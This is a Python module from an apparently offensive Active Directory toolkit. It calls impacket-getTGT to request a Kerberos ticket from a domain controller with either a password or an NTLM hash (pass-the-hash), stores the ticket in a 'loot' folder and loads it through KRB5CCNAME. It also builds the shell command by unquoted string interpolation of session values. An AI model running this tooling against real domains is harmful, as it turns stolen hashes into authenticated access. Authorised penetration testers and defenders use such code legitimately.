# modules/gettgt.py

import subprocess
import os
import glob
import shutil
from core.helpers import run_command
from core.colors import red, green, yellow, blue

def get_tgt(session):
    print(blue(f"[*] Requesting TGT for {session.username}@{session.domain}..."))

    if not shutil.which("impacket-getTGT"):
        print(red("[-] impacket-getTGT not found in PATH. Please install Impacket."))
        return

    loot_dir = "loot"
    os.makedirs(loot_dir, exist_ok=True)
    final_ccache = os.path.abspath(os.path.join(loot_dir, f"{session.username}.ccache"))

    # Step 1: Clean any existing temp .ccache files
    for f in glob.glob("*.ccache"):
        try:
            os.remove(f)
        except Exception:
            pass

    # Step 2: Build command
    if session.hash:
        cmd = f"impacket-getTGT {session.domain}/{session.username} -hashes :{session.hash} -dc-ip {session.dc_ip} -no-pass"
    elif session.password:
        cmd = f"impacket-getTGT {session.domain}/{session.username}:{session.password} -dc-ip {session.dc_ip}"
    else:
        print(red("[-] No password or hash found for TGT request."))
        return

    out, err = run_command(cmd)
    combined = out + "\n" + err

    # Step 3: Find new .ccache file
    ccache_files = sorted(glob.glob("*.ccache"), key=os.path.getctime, reverse=True)
    if not ccache_files:
        print(red("[-] Failed to get TGT or no .ccache file was created."))
        print(red(combined.strip()))
        return

    try:
        tgt_file = ccache_files[0]

        # Validate it's not empty
        if os.path.getsize(tgt_file) < 100:
            print(red(f"[-] CCache file {tgt_file} looks too small to be valid."))
            return

        os.rename(tgt_file, final_ccache)
        os.environ["KRB5CCNAME"] = final_ccache
        os.putenv("KRB5CCNAME", final_ccache)

        print(green(f"[+] TGT saved to: {final_ccache}"))
        print(green(f"[+] Loaded into memory via KRB5CCNAME"))
        print(yellow("[*] You can run 'custom klist' to verify ticket is active."))

    except Exception as e:
        print(red(f"[!] Failed to move or load ticket: {e}"))
